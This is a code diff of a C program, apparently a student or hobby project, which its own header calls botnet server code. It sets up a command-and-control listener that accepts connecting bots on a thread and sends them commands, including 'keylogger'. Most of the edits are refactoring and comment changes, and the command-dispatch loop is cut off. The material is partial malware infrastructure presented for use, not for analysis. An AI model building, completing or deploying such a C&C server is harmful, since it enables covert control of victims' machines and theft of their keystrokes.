@@ -6,8 +6,7 @@ Server code for botnet
 
 #include "server.h"
 
-pthread_mutex_t chatMutex = PTHREAD_MUTEX_INITIALIZER;
-static  bot_t bots[MAXBOTS];
+static bot_t bots[MAXBOTS];
 
 int claim_port(const char *port) {
     struct addrinfo    addrinfo;
@@ -55,9 +54,9 @@ int claim_port(const char *port) {
 }
 
 int main(int argc, char **argv) {
-    int                   ignore;
-    int                   sd;
-    char                  message[256];
+    int       sd, ignore;
+    char      message[256];
+    pthread_t sessionAcceptorThread;
     
     if ( argc < 2 ) {
         fprintf( stderr, "\x1b[1;31mMust specify port number on command line\x1b[0m\n");
@@ -69,24 +68,23 @@ int main(int argc, char **argv) {
         write( 1, message, sprintf( message,  "\x1b[1;31mCould not bind to port %s. Reason: %s\x1b[0m\n", argv[1], strerror( errno ) ) );
         return 1;
     } else {
-        pthread_t sessionAcceptorThread;
         pthread_create(&sessionAcceptorThread, NULL, sessionAcceptor, &sd);
         pthread_join(sessionAcceptorThread, NULL);
 
-        close( sd );
+        close(sd);
         return 0;
     }
 }
 
 void *sessionAcceptor(void *vargp) {
     /*
-    Accept new bots wanting to connect to C&C server
+    Accept new bots wanting to connect to C&C server. Implemented
+    using pthreads so there is no delay in accepting new connections
     */
     char                    errorMessage[100];
     char                    username[100];
     char                    returnmessage[1000];
-    int                     fd;
-    int                     br;
+    int                     br, fd;
     int                     sd = *((int *) vargp);
     int                     i = 0;
     socklen_t               ic;
@@ -140,11 +138,10 @@ void *sessionAcceptor(void *vargp) {
 
 void *botService(void *vargp) {
     /*
-    Handle commands for each specific bot
+    Send commands to bots to be run
     */
     bot_t *user = (bot_t *)vargp;
-
-    char commands[2][10] = {"keylogger", "reset"};
+    char  commands[2][10] = {"keylogger", "reset"};
 
     /*
     while (1) {
